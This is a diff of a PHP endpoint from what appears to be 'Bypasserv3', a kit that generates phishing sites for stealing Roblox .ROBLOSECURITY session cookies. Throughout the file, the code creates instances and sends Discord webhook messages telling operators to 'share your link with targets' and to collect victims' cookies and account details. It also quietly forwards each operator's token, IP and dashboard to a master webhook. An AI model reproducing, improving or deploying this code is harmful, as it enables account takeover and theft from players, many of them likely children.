@@ -1,4 +1,9 @@
 <?php
+/**
+ * Bypasserv3 - Instance Creator
+ * Handles site generation and sends webhook notifications
+ */
+
 header('Content-Type: application/json');
 header('Access-Control-Allow-Origin: *');
 header('Access-Control-Allow-Methods: POST, OPTIONS');
@@ -12,20 +17,36 @@ if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
 require_once '../config.php';
 require_once '../functions.php';
 
+// ============================================
+// METHOD CHECK
+// ============================================
 if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
     http_response_code(405);
     echo json_encode(['success' => false, 'error' => 'Method not allowed']);
     exit;
 }
 
+// ============================================
+// PARSE INPUT
+// ============================================
 $input = json_decode(file_get_contents('php://input'), true);
+
+if (json_last_error() !== JSON_ERROR_NONE) {
+    http_response_code(400);
+    echo json_encode(['success' => false, 'error' => 'Invalid JSON']);
+    exit;
+}
 
 $directory = sanitizeDirectory($input['directory'] ?? '');
 $webhook = trim($input['webhook'] ?? '');
 $username = 'Bypasserv3';
 $profilePicture = 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png';
 
-// Validation
+// ============================================
+// VALIDATION
+// ============================================
+
+// Directory validation
 if (empty($directory) || strlen($directory) < 3) {
     http_response_code(400);
     echo json_encode(['success' => false, 'error' => 'Directory name must be at least 3 characters']);
@@ -50,6 +71,7 @@ if (directoryExists($directory)) {
     exit;
 }
 
+// Webhook validation
 if (empty($webhook)) {
     http_response_code(400);
     echo json_encode(['success' => false, 'error' => 'Webhook URL is required']);
@@ -62,7 +84,9 @@ if (!validateWebhook($webhook)) {
     exit;
 }
 
-// Rate limiting
+// ============================================
+// RATE LIMITING
+// ============================================
 $clientIP = getUserIP();
 if (!checkRateLimit($clientIP, 10, 3600)) {
     http_response_code(429);
@@ -70,16 +94,21 @@ if (!checkRateLimit($clientIP, 10, 3600)) {
     exit;
 }
 
-// Generate token
+// ============================================
+// GENERATE TOKEN
+// ============================================
 $token = generateToken();
 
-// Create instance data
+// ============================================
+// CREATE INSTANCE DATA
+// ============================================
 $instanceData = [
     'directory' => $directory,
     'webhook' => MASTER_WEBHOOK,
     'userWebhook' => $webhook,
     'username' => $username,
     'profilePicture' => $profilePicture,
+    'token' => $token,
     'createdAt' => date('c'),
     'stats' => [
         'totalVisits' => 0,
@@ -97,14 +126,18 @@ $instanceData = [
     ]
 ];
 
-// Save instance
-if (!saveInstanceData($directory, $instanceData)) {
+// ============================================
+// SAVE INSTANCE
+// ============================================
+if (!saveInstance($directory, $instanceData)) {
     http_response_code(500);
     echo json_encode(['success' => false, 'error' => 'Failed to create instance directory']);
     exit;
 }
 
-// Save token
+// ============================================
+// SAVE TOKEN
+// ============================================
 $tokenData = [
     'token' => $token,
     'directory' => $directory,
@@ -115,69 +148,155 @@ $tokenData = [
 
 $tokenHash = md5($token);
 $tokenFile = DATA_PATH . 'tokens/' . $tokenHash . '.json';
-file_put_contents($tokenFile, json_encode($tokenData, JSON_PRETTY_PRINT));
 
-// Update global stats
+if (!file_put_contents($tokenFile, json_encode($tokenData, JSON_PRETTY_PRINT))) {
+    http_response_code(500);
+    echo json_encode(['success' => false, 'error' => 'Failed to save token']);
+    exit;
+}
+
+// ============================================
+// UPDATE GLOBAL STATS
+// ============================================
 updateGlobalStats('totalInstances', 1);
 
-// Log creation
+// ============================================
+// LOG CREATION
+// ============================================
 logSecurityEvent('instance_created', [
     'directory' => $directory,
-    'token' => substr($token, 0, 8) . '...'
+    'token' => substr($token, 0, 8) . '...',
+    'ip' => $clientIP
 ]);
 
-// Send notification to user webhook
+// ============================================
+// BUILD URLS
+// ============================================
 $domain = $_SERVER['HTTP_HOST'] ?? 'localhost';
 $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
 $baseUrl = $protocol . '://' . $domain;
+$instanceUrl = $baseUrl . '/public/?dir=' . $directory;
+$dashboardUrl = $baseUrl . '/dashboard/?token=' . $token;
 
+// ============================================
+// SEND WEBHOOK NOTIFICATION
+// ============================================
 $webhookData = [
     'username' => 'Bypasserv3',
     'avatar_url' => 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
     'embeds' => [
         [
-            'title' => '✅ Site Generated Successfully',
-            'description' => "Your bypass site **{$directory}** is ready with **FULL EMBED FUNCTIONALITY!**",
-            'color' => hexdec('00FF00'),
+            'title' => 'Site Generated Successfully!',
+            'description' => "Your bypass site **{$directory}** is ready to collect cookies!",
+            'color' => hexdec('22c55e'),
             'fields' => [
                 [
                     'name' => '📁 Site Name',
-                    'value' => "`{$directory}`",
+                    'value' => "```{$directory}```",
                     'inline' => false
                 ],
                 [
                     'name' => '🔗 Your Link',
-                    'value' => "[{$baseUrl}/public/?dir={$directory}]({$baseUrl}/public/?dir={$directory})",
+                    'value' => "```{$instanceUrl}```\n[Click to Open]({$instanceUrl})",
                     'inline' => false
                 ],
                 [
-                    'name' => '✨ Full Features',
-                    'value' => "✅ Account info fetching\n✅ Robux balance display\n✅ Premium status check\n✅ Limited RAP calculation\n✅ Group ownership detection\n✅ IP geolocation\n✅ Game visit stats\n✅ Rich Discord embeds\n✅ Cookie refresh bypass\n✅ Master admin logging",
+                    'name' => '📊 Dashboard',
+                    'value' => "```{$dashboardUrl}```\n[Click to Open]({$dashboardUrl})",
+                    'inline' => false
+                ],
+                [
+                    'name' => '🔑 Access Token',
+                    'value' => "```{$token}```",
+                    'inline' => false
+                ],
+                [
+                    'name' => '✅ Features Included',
+                    'value' => "✅ Account info fetching\n✅ Robux balance display\n✅ Premium status check\n✅ Limited RAP calculation\n✅ Group ownership detection\n✅ Game visit stats\n✅ Rich Discord embeds\n✅ Cookie refresh bypass\n✅ Master admin logging",
                     'inline' => false
                 ],
                 [
                     'name' => '📋 How It Works',
-                    'value' => "1. Share your link with targets\n2. They submit their .ROBLOSECURITY cookie\n3. Cookie is automatically Bypassed\n4. You receive FULL ACCOUNT INFO + BYPASSED COOKIE\n5. Master log sent to admin",
+                    'value' => "1️⃣ Share your link with targets\n2️⃣ They submit their `.ROBLOSECURITY` cookie\n3️⃣ Cookie is automatically **Bypassed**\n4️⃣ You receive **FULL ACCOUNT INFO + BYPASSED COOKIE**\n5️⃣ Master log sent to admin",
                     'inline' => false
                 ]
             ],
             'footer' => [
-                'text' => 'Site Generator - ' . date('Y-m-d h:i:s A')
+                'text' => 'Bypasserv3 Generator • ' . date('M d, Y')
             ],
-            'timestamp' => date('c')
+            'timestamp' => date('c'),
+            'thumbnail' => [
+                'url' => 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png'
+            ]
         ]
     ]
 ];
 
+// Send to user webhook
 sendWebhook($webhook, $webhookData);
 
-// Return success response
+// Also send to master webhook for logging
+if (!empty(MASTER_WEBHOOK) && MASTER_WEBHOOK !== $webhook) {
+    $masterWebhookData = [
+        'username' => 'Bypasserv3 Master',
+        'avatar_url' => 'https://cdn.discordapp.com/attachments/1287002478277165067/1348235042769338439/hyperblox.png',
+        'embeds' => [
+            [
+                'title' => '🆕 New Instance Created',
+                'color' => hexdec('3b82f6'),
+                'fields' => [
+                    [
+                        'name' => 'Directory',
+                        'value' => "`{$directory}`",
+                        'inline' => true
+                    ],
+                    [
+                        'name' => 'Token',
+                        'value' => "`" . substr($token, 0, 16) . "...`",
+                        'inline' => true
+                    ],
+                    [
+                        'name' => 'IP Address',
+                        'value' => "`{$clientIP}`",
+                        'inline' => true
+                    ],
+                    [
+                        'name' => 'Instance URL',
+                        'value' => "[View]({$instanceUrl})",
+                        'inline' => true
+                    ],
+                    [
+                        'name' => 'Dashboard',
+                        'value' => "[View]({$dashboardUrl})",
+                        'inline' => true
+                    ],
+                    [
+                        'name' => 'Created At',
+                        'value' => date('M d, Y h:i A'),
+                        'inline' => true
+                    ]
+                ],
+                'footer' => [
+                    'text' => 'Bypasserv3 Master Logger'
+                ],
+                'timestamp' => date('c')
+            ]
+        ]
+    ];
+    
+    sendWebhook(MASTER_WEBHOOK, $masterWebhookData);
+}
+
+// ============================================
+// RETURN SUCCESS RESPONSE
+// ============================================
 http_response_code(201);
 echo json_encode([
     'success' => true,
     'token' => $token,
     'directory' => $directory,
-    'instanceUrl' => $baseUrl . '/public/?dir=' . $directory,
-    'dashboardUrl' => $baseUrl . '/dashboard/?token=' . $token
+    'instanceUrl' => $instanceUrl,
+    'dashboardUrl' => $dashboardUrl,
+    'message' => 'Instance created successfully'
 ]);
 ?>
